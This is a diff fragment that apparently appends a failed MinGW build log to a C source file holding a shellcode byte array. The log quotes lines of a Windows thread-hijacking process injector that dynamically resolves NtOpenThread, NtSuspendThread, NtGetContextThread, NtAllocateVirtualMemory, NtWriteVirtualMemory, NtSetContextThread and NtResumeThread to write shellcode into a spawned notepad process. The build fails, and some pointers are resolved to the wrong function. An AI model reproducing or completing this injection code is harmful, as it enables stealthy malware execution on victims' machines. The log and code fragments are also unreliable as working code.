@@ -60,3 +60,153 @@ unsigned char buf[] =
 "\x82\x6f\xf2\x1c\x43\x13\x11\xf0\x4c\x73\x8d\x2c\xaf\x28"
 "\xbe\x61\xec\x56\x07\xa3\x8b\x40\x54\x60\xe6\x5d\x33\xe8"
 "\xb8\x43";
+
+
+
+====================[ Build | THREAD_EXE_HIJACK | Debug ]=======================
+"C:\Program Files\JetBrains\CLion 2025.1.2\bin\cmake\win\x64\bin\cmake.exe" --build C:\Users\fallon\CLionProjects\thread_hijack_rp\cmake-build-debug --target THREAD_EXE_HIJACK -- -j 1
+[ 50%] Building C object CMakeFiles/THREAD_EXE_HIJACK.dir/ntapi/main.c.obj
+In file included from C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:2:
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.h:195:3: error: expected declaration specifiers or '...' before '[' token
+  195 |   [in] PCWSTR pszFirst,
+      |   ^
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.h:196:3: error: expected declaration specifiers or '...' before '[' token
+  196 |   [in] PCWSTR pszSrch
+      |   ^
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:12: warning: "THREAD_ALL_ACCESS" redefined
+   12 | #define THREAD_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | SPECIFIC_RIGHTS_ALL)
+      |
+In file included from C:/Program Files/JetBrains/CLion 2025.1.2/bin/mingw/x86_64-w64-mingw32/include/minwindef.h:163,
+                 from C:/Program Files/JetBrains/CLion 2025.1.2/bin/mingw/x86_64-w64-mingw32/include/windef.h:9,
+                 from C:/Program Files/JetBrains/CLion 2025.1.2/bin/mingw/x86_64-w64-mingw32/include/windows.h:69,
+                 from C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.h:2:
+C:/Program Files/JetBrains/CLion 2025.1.2/bin/mingw/x86_64-w64-mingw32/include/winnt.h:4397: note: this is the location of the previous definition
+ 4397 | #define THREAD_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xffff)
+      |
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c: In function 'GetModHandle':
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:92:21: warning: implicit declaration of function 'StrStrIW'; did you mean 'strstr'? [-Wimplicit-function-declaration]
+   92 |                 if (StrStrIW(ln, data->FullDllName.Buffer)) {
+      |                     ^~~~~~~~
+      |                     strstr
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:95:36: warning: returning 'PVOID' {aka 'void *'} from a function with return type 'size_t' {aka 'long long unsigned int'} makes integer from pointer without a cast [-Wint-conversion]
+   95 |                         return data->DllBase;
+      |                                ~~~~^~~~~~~~~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c: In function 'main':
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:154:61: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  154 |         size_t ptr_CreateProcessA = (size_t)GetFuncAddr(mb, L"CreateProcessA");
+      |                                                             ^~~~~~~~~~~~~~~~~
+      |                                                             |
+      |                                                             short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:155:71: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  155 |         size_t ptr_CreateToolhelp32Snapshot = (size_t)GetFuncAddr(mb, L"CreateToolhelp32Snapshot");
+      |                                                                       ^~~~~~~~~~~~~~~~~~~~~~~~~~~
+      |                                                                       |
+      |                                                                       short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:156:61: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  156 |         size_t ptr_Process32First = (size_t)GetFuncAddr(mb, L"Process32First");
+      |                                                             ^~~~~~~~~~~~~~~~~
+      |                                                             |
+      |                                                             short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:157:60: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  157 |         size_t ptr_Process32Next = (size_t)GetFuncAddr(mb, L"Process32Next");
+      |                                                            ^~~~~~~~~~~~~~~~
+      |                                                            |
+      |                                                            short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:158:58: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  158 |         size_t ptr_CloseHandle = (size_t)GetFuncAddr(mb, L"CloseHandle");
+      |                                                          ^~~~~~~~~~~~~~
+      |                                                          |
+      |                                                          short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:161:58: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  161 |         size_t ptr_NtOpenThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
+      |                                                          ^~~~~~~~~~~~~~~
+      |                                                          |
+      |                                                          short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:162:61: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  162 |         size_t ptr_NtSuspendThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
+      |                                                             ^~~~~~~~~~~~~~~
+      |                                                             |
+      |                                                             short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:163:64: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  163 |         size_t ptr_NtGetContextThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
+      |                                                                ^~~~~~~~~~~~~~~
+      |                                                                |
+      |                                                                short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:164:69: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  164 |         size_t ptr_NtAllocateVirtualMemory = (size_t)GetFuncAddr(kb,L"NtOpenThread");
+      |                                                                     ^~~~~~~~~~~~~~~
+      |                                                                     |
+      |                                                                     short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:165:66: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  165 |         size_t ptr_NtWriteVirtualMemory = (size_t)GetFuncAddr(kb,L"NtWriteVirtualMemory");
+      |                                                                  ^~~~~~~~~~~~~~~~~~~~~~~
+      |                                                                  |
+      |                                                                  short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:166:65: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  166 |         size_t ptr_NtSetContextThread = (size_t)GetFuncAddr(kb, L"NtSetContextThread");
+      |                                                                 ^~~~~~~~~~~~~~~~~~~~~
+      |                                                                 |
+      |                                                                 short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:167:61: warning: passing argument 2 of 'GetFuncAddr' from incompatible pointer type [-Wincompatible-pointer-types]
+  167 |         size_t ptr_NtResumeThread = (size_t)GetFuncAddr(kb, L"NtResumeThread");
+      |                                                             ^~~~~~~~~~~~~~~~~
+      |                                                             |
+      |                                                             short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:108:39: note: expected 'char *' but argument is of type 'short unsigned int *'
+  108 | size_t GetFuncAddr(size_t modb, char* fn) {
+      |                                 ~~~~~~^~
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:185:185: warning: passing argument 1 of '(BOOL (*)(const CHAR *, CHAR *, struct _SECURITY_ATTRIBUTES *, struct _SECURITY_ATTRIBUTES *, BOOL,  DWORD,  void *, const CHAR *, struct _STARTUPINFOA *, struct _PROCESS_INFORMATION *))ptr_CreateProcessA' from incompatible pointer type [-Wincompatible-pointer-types]
+  185 |         BOOL proc =((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessA)(L"C:\\Windows\\System32\\notepad.exe",NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi );
+      |                                                                                                                                                                                         ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      |                                                                                                                                                                                         |
+      |                                                                                                                                                                                         short unsigned int *
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:185:185: note: expected 'LPCSTR' {aka 'const char *'} but argument is of type 'short unsigned int *'
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:214:140: warning: passing argument 4 of '(NTSTATUS (*)(void *, void *, ULONG_PTR,  ULONG_PTR *, ULONG,  ULONG))ptr_NtAllocateVirtualMemory' makes pointer from integer without a cast [-Wint-conversion]
+  214 |         status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hThread, &baseAddress, n,sizeof(buf),n,n);
+      |                                                                                                                                            ^~~~~~~~~~~
+      |                                                                                                                                            |
+      |                                                                                                                                            long long unsigned int
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:214:140: note: expected 'PSIZE_T' {aka 'long long unsigned int *'} but argument is of type 'long long unsigned int'
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:216:144: warning: passing argument 5 of '(NTSTATUS (*)(void *, void *, void *, SIZE_T,  ULONG_PTR *))ptr_NtWriteVirtualMemory' from incompatible pointer type [-Wincompatible-pointer-types]
+  216 |         status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hThread, &baseAddress, &buf, sizeof(buf), &n);
+      |                                                                                                                                                ^~
+      |                                                                                                                                                |
+      |                                                                                                                                                ULONG * {aka long unsigned int *}
+C:\Users\fallon\CLionProjects\thread_hijack_rp\ntapi\main.c:216:144: note: expected 'PSIZE_T' {aka 'long long unsigned int *'} but argument is of type 'ULONG *' {aka 'long unsigned int *'}
+mingw32-make[3]: *** [CMakeFiles\THREAD_EXE_HIJACK.dir\build.make:78: CMakeFiles/THREAD_EXE_HIJACK.dir/ntapi/main.c.obj] Error 1
+mingw32-make[2]: *** [CMakeFiles\Makefile2:86: CMakeFiles/THREAD_EXE_HIJACK.dir/all] Error 2
+mingw32-make[1]: *** [CMakeFiles\Makefile2:93: CMakeFiles/THREAD_EXE_HIJACK.dir/rule] Error 2
+mingw32-make: *** [Makefile:130: THREAD_EXE_HIJACK] Error 2
